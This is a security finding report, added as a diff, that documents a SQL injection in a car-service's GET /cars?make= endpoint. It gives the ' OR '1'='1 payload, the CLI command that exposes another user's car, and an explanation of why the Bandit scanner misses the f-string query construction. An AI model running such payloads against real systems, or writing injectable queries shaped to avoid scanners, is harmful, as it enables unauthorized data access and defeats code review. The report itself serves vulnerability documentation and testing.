@@ -1,0 +1,27 @@
+V3 - SQL Injection (CWE-89) on car-service GET /cars?make=
+Date: 2026-10-18T17:02:33Z
+Commit: ec58710 + uncommitted change in car-service/app/db.py (make inserted with an f-string)
+Environment: docker compose, fresh seed. Car 1 is alice's, car 2 is bob's. Logged in as alice.
+
+The owner filter still runs:  ... AND owner = ? AND make = '<make>' ...
+The payload ' OR '1'='1 closes the make literal and appends OR '1'='1' (always true),
+so the WHERE clause matches every row regardless of owner.
+
+Baseline - alice lists her own cars (no filter):
+$ python3 cli/carcli.py cars list
+ owners: ['alice']
+
+Exploit - alice injects through --make:
+$ python3 cli/carcli.py cars list --make "' OR '1'='1"
+ rows returned: 2
+  car 1 owner alice Volvo V70
+  car 2 owner bob Audi A4
+
+Bandit (SAST) on car-service/app:
+$ bandit -r car-service/app
+ Result: No issues identified. B608 is NOT reported.
+ Reason: the query is built by += with the fragment " AND make = '\''...'\''", which holds no
+ SQL keyword, so Bandit's B608 heuristic does not recognise it as SQL construction.
+ A control test confirmed Bandit flags B608 when the SELECT itself is in the f-string.
+
+Result: alice (seller) receives bob's car 2, which the owner filter should have hidden.
